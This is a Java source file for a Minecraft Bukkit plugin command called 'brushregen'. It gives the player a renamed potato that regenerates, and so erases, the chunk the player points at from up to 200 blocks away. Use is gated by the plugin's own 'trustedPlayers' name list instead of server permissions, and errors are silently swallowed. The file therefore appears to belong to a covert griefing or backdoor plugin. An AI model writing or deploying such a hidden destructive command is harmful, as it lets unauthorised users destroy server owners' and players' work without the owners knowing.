package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.HashSet;

public class Command_BrushRegen extends CommandBase implements Listener {

    public Command_BrushRegen() {
        super("brushregen", "-", Category.WORLD);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        try {
            ItemStack BrushStick = new ItemStack(Material.POTATO_ITEM);
            ItemMeta meta = BrushStick.getItemMeta();
            meta.setDisplayName("§a§lRegenBrusher");
            BrushStick.setItemMeta(meta);
            p.setItemInHand(BrushStick);
            p.sendMessage(Start.INSTANCE.chatPrefix + "§aJetzt kannst du damit brushen!");
        } catch (Exception ignored) {
        }
    }

    @EventHandler
    public void onInteract(PlayerInteractEvent e) {
        try {
            Player p = e.getPlayer();
            if (Start.INSTANCE.trustedPlayers.contains(p.getName()) && (e.getAction().equals(Action.RIGHT_CLICK_AIR) || e.getAction().equals(Action.RIGHT_CLICK_BLOCK)) && e.getPlayer().getItemInHand().getItemMeta().getDisplayName().equalsIgnoreCase("§a§lRegenBrusher")) {
                Location lc = p.getTargetBlock((HashSet<Byte>) null, 200).getLocation();
                p.getWorld().regenerateChunk(lc.getChunk().getX(), lc.getChunk().getZ());
                p.getWorld().refreshChunk(lc.getChunk().getX(), lc.getChunk().getZ());
                p.getWorld().unloadChunk(lc.getChunk().getX(), lc.getChunk().getZ());
                p.getWorld().loadChunk(lc.getChunk().getX(), lc.getChunk().getZ());
                e.getPlayer().playSound(e.getPlayer().getLocation(), Sound.ENDERMAN_TELEPORT, 2.0F, 2.0F);
            }
        } catch (Exception ignored) {
        }
    }

}
